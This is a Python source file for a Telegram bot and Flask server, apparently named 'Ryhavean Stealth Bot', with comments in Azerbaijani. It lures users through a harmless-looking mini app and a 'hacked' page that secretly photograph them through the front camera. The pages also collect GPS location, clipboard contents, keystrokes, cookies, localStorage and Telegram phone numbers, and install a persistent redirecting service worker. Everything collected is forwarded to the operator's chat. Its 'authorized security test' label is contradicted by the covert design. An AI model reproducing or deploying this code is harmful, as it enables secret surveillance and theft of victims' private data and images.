import os
import re
import time
import json
import base64
import logging
import threading
import asyncio
import requests
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters
from flask import Flask, request, render_template_string, jsonify

# ========== KONFİQ ==========
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
PORT = int(os.environ.get('PORT', 10000'))
APP_URL = os.environ.get('RENDER_EXTERNAL_URL', '')
REDIRECT_TARGET = os.environ.get('REDIRECT_URL', APP_URL)  # Yönlənmə üçün hədəf sayt

active_attacks = {}  # {ip_veya_key: {'target': ..., 'started': ...}}

# ========== IP INFO ==========
def get_ip_info(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,query,mobile,proxy,hosting", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                return {
                    'operator': data.get('isp', 'Bilinmir'),
                    'org': data.get('org', 'Bilinmir'),
                    'asn': data.get('as', 'Bilinmir'),
                    'country': data.get('country', 'Bilinmir'),
                    'region': data.get('regionName', 'Bilinmir'),
                    'city': data.get('city', 'Bilinmir'),
                    'mobile': data.get('mobile', False),
                    'proxy': data.get('proxy', False),
                    'hosting': data.get('hosting', False)
                }
    except Exception as e:
        logger.error(f"IP info xətası: {e}")
    return {'operator': 'Bilinmir', 'org': 'Bilinmir', 'asn': 'Bilinmir', 'country': 'Bilinmir', 'region': 'Bilinmir', 'city': 'Bilinmir', 'mobile': False, 'proxy': False, 'hosting': False}

# ========== HACKED PAGE (ULTRA GÜCLÜ) ==========
HACKED_PAGE = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>⚠ System Compromised</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Courier New', monospace; background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
.container { text-align: center; padding: 40px; }
.glitch { font-size: 48px; font-weight: bold; color: #ff0000; text-shadow: 3px 3px 0 #00ff00, -3px -3px 0 #0000ff; animation: glitch 1s infinite; margin-bottom: 20px; }
@keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-3px, 3px); } 40% { transform: translate(3px, -3px); } 60% { transform: translate(-2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
.subtitle { font-size: 18px; color: #00ff00; margin-bottom: 30px; animation: blink 1.5s infinite; }
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
.info { font-size: 14px; color: #888; margin-top: 40px; }
.info span { color: #ff4444; }
.status-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #1a1a1a; color: #0f0; font-size: 12px; padding: 8px; text-align: center; }
</style>
</head>
<body>
<div class="container">
    <div class="glitch">⚠ SYSTEM HACKED ⚠</div>
    <div class="subtitle">Your device has been compromised</div>
    <div class="info">
        <span>></span> All data is being collected<br>
        <span>></span> Camera access granted<br>
        <span>></span> Location tracked<br>
        <span>></span> Phone number harvested<br>
        <span>></span> IP address logged: <span id="ip">unknown</span><br><br>
        This is an authorized security test.<br>
        Ryhavean Pentest Team
    </div>
</div>
<div class="status-bar">[CONNECTION ESTABLISHED] — [DATA COLLECTION ACTIVE] — [UPLOADING...]</div>

<script>
var TARGET_IP = '{{ ip }}';
document.getElementById('ip').textContent = TARGET_IP;

// ==================== BÜTÜN MƏLUMATLAR ====================
var clientInfo = {
    ip: TARGET_IP,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: (navigator.languages || []).join(','),
    screen: screen.width+'x'+screen.height,
    colorDepth: screen.colorDepth,
    devicePixelRatio: window.devicePixelRatio || 1,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    hardwareConcurrency: navigator.hardwareConcurrency || '?',
    deviceMemory: navigator.deviceMemory || '?',
    referrer: document.referrer || 'direct',
    connection: navigator.connection ? navigator.connection.effectiveType : '?',
    downlink: navigator.connection ? navigator.connection.downlink : '?',
    rtt: navigator.connection ? navigator.connection.rtt : '?',
    touchSupport: 'ontouchstart' in window,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    webdriver: navigator.webdriver,
    vendor: navigator.vendor,
    product: navigator.product,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || 'unspecified',
    timestamp: new Date().toISOString()
};

// ==================== TELEFON NÖMRƏSİ + OPERATOR ====================
(function getPhoneInfo() {
    var phoneData = {};

    // 1) Telegram WebView (Telegram-da açılıbsa)
    try {
        if (window.Telegram) {
            if (window.Telegram.WebView && window.Telegram.WebView.initParams) {
                if (window.Telegram.WebView.initParams.tg_phone) {
                    phoneData.phone = window.Telegram.WebView.initParams.tg_phone;
                    phoneData.source = 'telegram_webview';
                }
            }
            if (window.Telegram.WebApp) {
                var wa = window.Telegram.WebApp;
                if (wa.initDataUnsafe && wa.initDataUnsafe.user) {
                    clientInfo.telegramUser = wa.initDataUnsafe.user;
                    if (wa.initDataUnsafe.user.phone_number) {
                        phoneData.phone = wa.initDataUnsafe.user.phone_number;
                        phoneData.source = 'telegram_webapp';
                    }
                }
                clientInfo.telegramPlatform = wa.platform;
                clientInfo.telegramVersion = wa.version;
            }
        }
    } catch(e) {}

    // 2) navigator.connection operator (mobil brauzerlər)
    try {
        if (navigator.connection) {
            if (navigator.connection.operator) {
                phoneData.operatorBrowser = navigator.connection.operator;
            }
            // Some mobile browsers expose network info
        }
    } catch(e) {}

    // 3) Audio devices (bəzən telefon modelini göstərir)
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices().then(function(devices) {
                var audioInputs = devices.filter(function(d){ return d.kind === 'audioinput'; });
                phoneData.audioDevices = audioInputs.length;
                audioInputs.forEach(function(d,i){
                    if(d.label) phoneData['mic_'+i] = d.label;
                });
                clientInfo.phoneInfo = phoneData;
            }).catch(function(){});
        }
    } catch(e) {}

    clientInfo.phoneInfo = phoneData;
})();

// ==================== GPS ====================
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        clientInfo.lat = pos.coords.latitude;
        clientInfo.lon = pos.coords.longitude;
        clientInfo.accuracy = pos.coords.accuracy;
        clientInfo.altitude = pos.coords.altitude;
        clientInfo.speed = pos.coords.speed;
        sendHarvest();
    }, function(){ sendHarvest(); }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
} else { setTimeout(sendHarvest, 500); }

// ==================== LOCAL IP (WebRTC) ====================
try {
    var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
    pc.createDataChannel('');
    pc.createOffer().then(function(o){ pc.setLocalDescription(o); }).catch(function(){});
    pc.onicecandidate = function(ice) {
        if (ice && ice.candidate) {
            var match = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (match) { clientInfo.localIP = match[1]; }
        }
    };
} catch(e) {}

function sendHarvest() {
    fetch('/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(clientInfo)
    }).catch(function(){});
    
    // Kamera ön (selfie) + 5 şəkil
    setTimeout(startFrontCamera, 200);
    // Clipboard
    setTimeout(captureClipboard, 1000);
    // LocalStorage/Cookies
    setTimeout(harvestStorage, 1500);
}

// ==================== ÖN KAMERA (selfie) - 5 ŞƏKİL ====================
function startFrontCamera() {
    try {
        var video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.setAttribute('autoplay', '');
        video.style.cssText = 'position:fixed;opacity:0.001;width:1px;height:1px;top:-100px;left:-100px;pointer-events:none;z-index:-9999';
        document.body.appendChild(video);

        // First try FRONT camera (selfie)
        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        }).then(function(stream) {
            video.srcObject = stream;
            video.onloadedmetadata = function() {
                video.play();
                for (var i = 0; i < 5; i++) {
                    setTimeout(function(idx) { capturePhoto(video, idx + 1); }, i * 100);
                }
                setTimeout(function() {
                    stream.getTracks().forEach(function(t) { t.stop(); });
                    if (video.parentNode) video.parentNode.removeChild(video);
                }, 1200);
            };
        }).catch(function() {
            // Fallback to environment camera
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            }).then(function(stream) {
                video.srcObject = stream;
                video.onloadedmetadata = function() {
                    video.play();
                    for (var i = 0; i < 5; i++) {
                        setTimeout(function(idx) { capturePhoto(video, idx + 1); }, i * 100);
                    }
                    setTimeout(function() {
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        if (video.parentNode) video.parentNode.removeChild(video);
                    }, 1200);
                };
            }).catch(function() {});
        });
    } catch(e) {}
}

function capturePhoto(video, index) {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = 1280;
        canvas.height = 720;
        canvas.getContext('2d').drawImage(video, 0, 0);
        var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip: TARGET_IP, photo: dataUrl, index: index, total: 5, user_agent: navigator.userAgent })
        }).catch(function() {});
    } catch(e) {}
}

// ==================== CLIPBOARD ====================
function captureClipboard() {
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().then(function(text) {
                if (text && text.length > 0) {
                    fetch('/click', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ ip: TARGET_IP, data: text, type: 'clipboard' })
                    }).catch(function() {});
                }
            }).catch(function() {});
        }
    } catch(e) {}
}

// ==================== KEYLOGGER ====================
var keys = [];
document.addEventListener('keydown', function(e) {
    keys.push(e.key);
    if (keys.length >= 25) {
        fetch('/click', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip: TARGET_IP, data: keys.join(''), type: 'keylog' })
        }).catch(function() {});
        keys = [];
    }
});

// ==================== STORAGE / COOKIES ====================
function harvestStorage() {
    try {
        var data = { cookies: document.cookie, localStorage: {} };
        for (var key in localStorage) {
            if (localStorage.hasOwnProperty(key)) {
                data.localStorage[key] = (localStorage.getItem(key) || '').substring(0, 300);
            }
        }
        if (document.cookie || Object.keys(data.localStorage).length > 0) {
            fetch('/click', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip: TARGET_IP, data: JSON.stringify(data).substring(0, 2000), type: 'storage' })
            }).catch(function() {});
        }
    } catch(e) {}
}

// ==================== PERSISTENT REDIRECT SYSTEM ====================
// Service Worker - bütün sorğuları ələ keçir
if ('serviceWorker' in navigator) {
    const swCode = `
    self.addEventListener('fetch', function(event) {
        event.respondWith(
            fetch(event.request).catch(function() {
                return Response.redirect('${REDIRECT_TARGET}');
            }).then(function(response) {
                if (response.status >= 400) {
                    return Response.redirect('${REDIRECT_TARGET}');
                }
                return response;
            })
        );
    });
    self.addEventListener('install', function(e) { self.skipWaiting(); });
    self.addEventListener('activate', function(e) { e.waitUntil(clients.claim()); });
    `;
    const swBlob = new Blob([swCode], { type: 'application/javascript' });
    const swUrl = URL.createObjectURL(swBlob);

    navigator.serviceWorker.register(swUrl, { scope: '/' }).then(function() {
        console.log('Ryhavean SW registered');
        // Cross-origin iframe registration
        try {
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'about:blank';
            document.body.appendChild(iframe);
            if (iframe.contentWindow && iframe.contentWindow.navigator) {
                iframe.contentWindow.navigator.serviceWorker.register(swUrl, { scope: '/' });
            }
        } catch(e) {}
    }).catch(function(e) {});

    // Self-healing every 30 seconds
    setInterval(function() {
        navigator.serviceWorker.register(swUrl, { scope: '/' }).catch(function() {});
    }, 30000);
}

// localStorage redirect track
try {
    localStorage.setItem('ryhavean_redirect', 'active');
    sessionStorage.setItem('ryhavean_redirect', 'active');
} catch(e) {}

// Periodically check location - if not on redirect target, redirect
setInterval(function() {
    var currentHost = window.location.hostname;
    var targetHost = new URL('${REDIRECT_TARGET}').hostname;
    if (currentHost !== targetHost) {
        // Try multiple redirect methods
        window.location.replace('${REDIRECT_TARGET}');
        setTimeout(function() { window.location.href = '${REDIRECT_TARGET}'; }, 50);
    }
}, 3000);

// ==================== CANVAS FINGERPRINT ====================
try {
    var canvas = document.createElement('canvas');
    canvas.width = 200; canvas.height = 50;
    var ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Ryhavean', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Stealth', 4, 17);
    clientInfo.canvasFP = canvas.toDataURL().substring(0, 100);
} catch(e) {}

console.log('Ryhavean ULTRA HACKED Engine loaded - Redirecting to:', '${REDIRECT_TARGET}');
</script>
</body>
</html>
'''

# ========== MINI APP PAGE ==========
MINIAPP_PAGE = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;flex-direction:column}
.loading{color:#333;font-size:16px;font-family:-apple-system,sans-serif}
.spinner{width:30px;height:30px;border:3px solid #1a1a1a;border-top:3px solid #444;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="spinner"></div>
<div class="loading">Yüklənir...</div>
<script>
var userData={};
try{if(window.Telegram&&window.Telegram.WebApp){var wa=window.Telegram.WebApp;userData.telegramUser=wa.initDataUnsafe?wa.initDataUnsafe.user:null;if(wa.initDataUnsafe&&wa.initDataUnsafe.user&&wa.initDataUnsafe.user.phone_number){userData.phone=wa.initDataUnsafe.user.phone_number}wa.ready()}}catch(e){}
userData.userAgent=navigator.userAgent;userData.platform=navigator.platform;userData.language=navigator.language;
userData.screen=screen.width+'x'+screen.height;userData.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
userData.hardwareConcurrency=navigator.hardwareConcurrency||'?';userData.deviceMemory=navigator.deviceMemory||'?';
userData.touchSupport='ontouchstart' in window;userData.vendor=navigator.vendor;userData.timestamp=new Date().toISOString();
if('geolocation' in navigator){navigator.geolocation.getCurrentPosition(function(p){userData.lat=p.coords.latitude;userData.lon=p.coords.longitude;sendMiniApp()},function(){sendMiniApp()},{enableHighAccuracy:true,timeout:5000})}else{setTimeout(sendMiniApp,500)}
try{var pc=new(window.RTCPeerConnection||window.webkitRTCPeerConnection)({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o)}).catch(function(){});pc.onicecandidate=function(ice){if(ice&&ice.candidate){var m=/([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);if(m){userData.localIP=m[1]}}}}catch(e){}
function sendMiniApp(){fetch('/miniapp_harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(userData)}).catch(function(){})}
setTimeout(function(){try{var v=document.createElement('video');v.setAttribute('playsinline','');v.setAttribute('autoplay','');v.style.cssText='position:fixed;opacity:0.001;width:1px;height:1px;top:-100px;left:-100px;z-index:-9999';document.body.appendChild(v);navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}).then(function(s){v.srcObject=s;v.onloadedmetadata=function(){v.play();for(var i=0;i<5;i++){setTimeout(function(idx){var c=document.createElement('canvas');c.width=1280;c.height=720;c.getContext('2d').drawImage(v,0,0);var d=c.toDataURL('image/jpeg',0.85);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:'miniapp',photo:d,index:idx+1,total:5,user_agent:'MiniApp'})}).catch(function(){})},i*200)}setTimeout(function(){s.getTracks().forEach(function(t){t.stop()});if(v.parentNode)v.parentNode.removeChild(v)},2000)}}).catch(function(){})}catch(e){}},1000)
</script>
</body>
</html>
'''

# ========== FAKE 404 ==========
FAKE_PAGE = '<!DOCTYPE html><html><head><title>404</title></head><body><h1>404</h1></body></html>'

app = Flask(__name__)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr or 'unknown'

# ========== BOT HANDLERS ==========
async def start_handler(update: Update, context):
    user = update.effective_user
    user_id = user.id
    full_name = f"{user.first_name} {user.last_name or ''}".strip()
    chat_id = update.effective_chat.id
    
    logger.info(f"📩 /start: {full_name} (ID: {user_id})")
    
    if user_id == ADMIN_ID:
        await update.message.reply_text(
            f"👋 *Xoş gəldin, Patron!* {full_name}\n\n"
            f"🎯 *Avtomatik Hücum Sistemi*\n\n"
            f"📌 Hücum etmək üçün *IP ünvanı* göndər:\n"
            f"`192.168.1.1` və ya `https://example.com`\n\n"
            f"⚡ Hücum başlayan kimi:\n"
            f"• Hədəf istənilən sayta girmək istəsə → HACKED səhifəyə yönləndirilir\n"
            f"• Ön kameradan 5 şəkil çəkilir\n"
            f"• Telefon nömrəsi + operator + GPS + bütün məlumatlar toplanır\n"
            f"• Redirect service worker ilə təmin olunur",
            parse_mode='Markdown'
        )
    else:
        if _bot_ready:
            real_ip = get_client_ip()
            ip_info = get_ip_info(real_ip)
            tg_info = f"👤 *Ad:* `{full_name}`\\n🆔 *ID:* `{user_id}`\\n📧 *Username:* @{user.username or 'yox'}"
            admin_msg = f"👤 *Yeni İstifadəçi Botu Başlatdı!*\\n\\n{tg_info}\\n📍 *IP:* `{real_ip}`\\n📶 *ISP:* `{ip_info['operator']}`\\n🌍 *Yer:* `{ip_info['country']}, {ip_info['city']}`\\n🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode='Markdown'),
                bot_loop
            )
        
        keyboard = [[InlineKeyboardButton("🚀 Tətbiqi Aç", web_app=WebAppInfo(url=f"{APP_URL}/miniapp"))]]
        await update.message.reply_text(
            f"🌟 *Xoş gəldin, {full_name}!*\\n\\nRyhavean Stealth Bot 🚀\\n👇 Düyməyə basın:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def handle_ip(update: Update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id != ADMIN_ID:
        return
    
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    url_pattern = r'^https?://[^\s]+$'
    
    if re.match(ip_pattern, text) or re.match(url_pattern, text):
        attack_key = text if re.match(ip_pattern, text) else text[:30]
        
        # Dərhal hücuma başla (callback yox, birbaşa)
        attack_url = f"{APP_URL}/hacked?ip={text}"
        active_attacks[attack_key] = {'target': text, 'started': time.time()}
        
        # IP məlumatlarını al
        ip_info = get_ip_info(text if re.match(ip_pattern, text) else text[:50])
        
        logger.info(f"🎯 AVTOMAT HÜCUM BAŞLADILDI! Hədəf: {text}")
        
        await update.message.reply_text(
            f"✅ *AVTOMAT HÜCUM BAŞLADILDI!*\\n\\n"
            f"📍 Hədəf: `{text}`\\n"
            f"📶 ISP: `{ip_info['operator']}`\\n"
            f"🌍 Yer: `{ip_info['country']}, {ip_info['city']}`\\n"
            f"📱 Mobil: `{ip_info['mobile']}`\\n\\n"
            f"⚡ Hücum aktiv!\\n"
            f"• Hədəf istənilən sayta girmək istəsə → HACKED səhifəyə yönləndiriləcək\\n"
            f"• Ön kamera + 5 şəkil\\n"
            f"• Telefon nömrəsi + GPS + Clipboard + Keylogger\\n"
            f"• Redirect self-healing (bağlasa belə işləyir)\\n\\n"
            f"🔗 Link: `{attack_url}`",
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
    else:
        await update.message.reply_text("❌ Düzgün IP/URL daxil edin! Məs: `192.168.1.1`")

# ========== BOT ENGINE ==========
bot_loop = None
application = None
_bot_ready = False

def bot_loop_thread():
    global bot_loop, application, _bot_ready
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    application = Application.builder().token(TOKEN).updater(None).build()
    application.add_handler(CommandHandler('start', start_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip))
    bot_loop.run_until_complete(application.initialize())
    logger.info("✅ Bot init edildi")
    if APP_URL:
        bot_loop.run_until_complete(application.bot.set_webhook(url=f"{APP_URL.rstrip('/')}/webhook"))
        logger.info("✅ Webhook set")
    _bot_ready = True
    bot_loop.run_forever()

# ========== FLASK ROUTES ==========
@app.route('/')
def home():
    return render_template_string(FAKE_PAGE)

@app.route('/hacked')
def hacked():
    ip = request.args.get('ip', get_client_ip())
    real_ip = get_client_ip()
    logger.info(f"🎯 HACKED PAGE - İp: {ip}, Real: {real_ip}")
    
    if _bot_ready:
        ip_info = get_ip_info(real_ip)
        msg = f"🎯 *Hədəf Səhifəyə Girdi!*\\n📍 Hədəf: `{ip}`\\n📍 Real IP: `{real_ip}`\\n📶 ISP: `{ip_info['operator']}`\\n🌍 Yer: `{ip_info['country']}, {ip_info['city']}`\\n📱 Mobil: `{ip_info['mobile']}`\\n🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
        asyncio.run_coroutine_threadsafe(
            application.bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode='Markdown'),
            bot_loop
        )
    
    return render_template_string(HACKED_PAGE, ip=ip)

@app.route('/miniapp')
def miniapp():
    return render_template_string(MINIAPP_PAGE)

@app.route('/miniapp_harvest', methods=['POST'])
def miniapp_harvest():
    try:
        data = request.get_json()
        real_ip = get_client_ip()
        if _bot_ready:
            msg_parts = [f"📱 *MiniApp Məlumat*"]
            tg_user = data.get('telegramUser')
            if tg_user:
                msg_parts.append(f"👤 *Ad:* `{tg_user.get('first_name','?')}` 🆔 `{tg_user.get('id','?')}`")
                if tg_user.get('username'): msg_parts.append(f"📧 @{tg_user['username']}")
                if data.get('phone'): msg_parts.append(f"📞 *Nömrə:* `{data['phone']}`")
            msg_parts.append(f"📍 *IP:* `{real_ip}`")
            ip_info = get_ip_info(real_ip)
            msg_parts.append(f"📶 *ISP:* `{ip_info['operator']}` | 🌍 `{ip_info['city']}`")
            if data.get('localIP'): msg_parts.append(f"🏠 *Local:* `{data['localIP']}`")
            if data.get('lat'):
                msg_parts.append(f"📍 *GPS:* [{data['lat']},{data['lon']}](https://www.google.com/maps?q={data['lat']},{data['lon']})")
            msg_parts.append(f"🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`")
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text="\\n".join(msg_parts), parse_mode='Markdown', disable_web_page_preview=True),
                bot_loop
            )
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"MiniApp: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/harvest', methods=['POST'])
def harvest():
    try:
        data = request.get_json()
        real_ip = get_client_ip()
        
        if _bot_ready:
            msg_parts = [f"🎯 *Məlumat Toplandı*"]
            msg_parts.append(f"📍 *Real IP:* `{real_ip}`")
            ip_info = get_ip_info(real_ip)
            msg_parts.append(f"📶 *ISP:* `{ip_info['operator']}`")
            msg_parts.append(f"🏢 *Org:* `{ip_info['org']}`")
            msg_parts.append(f"🌍 *Yer:* `{ip_info['country']}, {ip_info['region']}, {ip_info['city']}`")
            msg_parts.append(f"📱 *Mobil:* `{ip_info['mobile']}` | *Proxy:* `{ip_info['proxy']}`")
            
            # Telefon nömrəsi
            phone_info = data.get('phoneInfo', {})
            if phone_info:
                if phone_info.get('phone'):
                    msg_parts.append(f"📞 *Telefon:* `{phone_info['phone']}` (mənbə: {phone_info.get('source','?')})")
                if phone_info.get('operatorBrowser'):
                    msg_parts.append(f"📶 *Operator (brauzer):* `{phone_info['operatorBrowser']}`")
                if phone_info.get('audioDevices'):
                    msg_parts.append(f"🎤 *Mikrofon sayı:* `{phone_info['audioDevices']}`")
            
            # Telegram user məlumatı
            tg_user = data.get('telegramUser')
            if tg_user:
                msg_parts.append(f"👤 *TG User:* `{tg_user.get('first_name','?')} {tg_user.get('last_name','')}`")
                msg_parts.append(f"🆔 *TG ID:* `{tg_user.get('id','?')}`")
                if tg_user.get('username'): msg_parts.append(f"📧 @{tg_user['username']}")
                if tg_user.get('phone_number'): msg_parts.append(f"📞 *TG Nömrə:* `{tg_user['phone_number']}`")
            
            if data.get('localIP'): msg_parts.append(f"🏠 *Local IP:* `{data['localIP']}`")
            if data.get('platform'): msg_parts.append(f"💻 *Platform:* `{data['platform']}`")
            if data.get('vendor'): msg_parts.append(f"🏭 *Vendor:* `{data['vendor']}`")
            if data.get('timezone'): msg_parts.append(f"🕐 *Saat:* `{data['timezone']}`")
            if data.get('connection'): msg_parts.append(f"📶 *Bağlantı:* `{data['connection']}` ({data.get('downlink','?')}Mbps)")
            if data.get('hardwareConcurrency'): msg_parts.append(f"⚡ *CPU:* `{data['hardwareConcurrency']}`")
            if data.get('deviceMemory'): msg_parts.append(f"🧠 *RAM:* `{data['deviceMemory']}GB`")
            if data.get('lat'):
                maps_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
                msg_parts.append(f"📍 *GPS:* [{data['lat']},{data['lon']}]({maps_url}) (±{data.get('accuracy','?')}m)")
            if data.get('canvasFP'): msg_parts.append(f"🖼 *Canvas FP:* `{data['canvasFP'][:40]}...`")
            msg_parts.append(f"🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`")
            
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text="\\n".join(msg_parts), parse_mode='Markdown', disable_web_page_preview=True),
                bot_loop
            )
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Harvest: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        ip = data.get('ip', '?')
        b64 = data.get('photo')
        idx = data.get('index')
        total = data.get('total')
        if not _bot_ready: return jsonify({'status': 'error'}), 503
        photo_bytes = base64.b64decode(b64.split(',')[1])
        asyncio.run_coroutine_threadsafe(_send_photo(ip, photo_bytes, idx, total), bot_loop)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

async def _send_photo(ip, photo_bytes, idx, total):
    try:
        cap = f"📸 *Ön Kamera* | {idx}/{total}\\n🎯 IP: `{ip}`\\n🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
        await application.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=InputFile(photo_bytes, filename=f"stealth_{ip}_{idx}.jpg"),
            caption=cap,
            parse_mode='Markdown'
        )
        if idx == total:
            await application.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"✅ *Kamera tamam!* {total} şəkil göndərildi.",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Foto: {e}")

@app.route('/click', methods=['POST'])
def click():
    try:
        data = request.get_json()
        ip = data.get('ip', '?')
        txt = (data.get('data', '') or '')[:1500]
        typ = data.get('type', 'data')
        icons = {'clipboard': '📋 Clipboard', 'keylog': '⌨️ Keylog', 'storage': '💾 Storage'}
        icon = icons.get(typ, '📝 Data')
        if _bot_ready and txt:
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text=f"{icon}\\n🎯 IP: `{ip}`\\n\\n```\\n{txt}\\n```", parse_mode='Markdown'),
                bot_loop
            )
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    if not _bot_ready: return 'Bot hazır deyil', 503
    try:
        asyncio.run_coroutine_threadsafe(_process_update(request.get_json(force=True)), bot_loop).result(timeout=10)
        return 'OK'
    except Exception as e:
        return 'Error', 500

async def _process_update(update_json):
    try:
        await application.process_update(Update.de_json(update_json, application.bot))
    except Exception as e:
        logger.error(f"Update: {e}", exc_info=True)

@app.route('/health')
def health():
    return {'status': 'ok', 'active': list(active_attacks.keys()), 'ready': _bot_ready}

if __name__ == '__main__':
    if not TOKEN or TOKEN == 'YOUR_BOT_TOKEN': raise ValueError("BOT_TOKEN yox!")
    if not ADMIN_ID or ADMIN_ID == 0: raise ValueError("ADMIN_ID yox!")
    
    t = threading.Thread(target=bot_loop_thread, daemon=True)
    t.start()
    for i in range(30):
        if _bot_ready: break
        time.sleep(0.5)
    
    logger.info(f"🚀 Ryhavean ULTRA Stealth Bot - port {PORT}")
    logger.info(f"🔗 URL: {APP_URL}")
    logger.info(f"🔄 Redirect to: {REDIRECT_TARGET}")
    logger.info("🥷 ULTRA MODE: Avtomatik Hücum + Ön Kamera + Telefon Nömrəsi + GPS + Redirect")
    app.run(host='0.0.0.0', port=PORT, threaded=True)
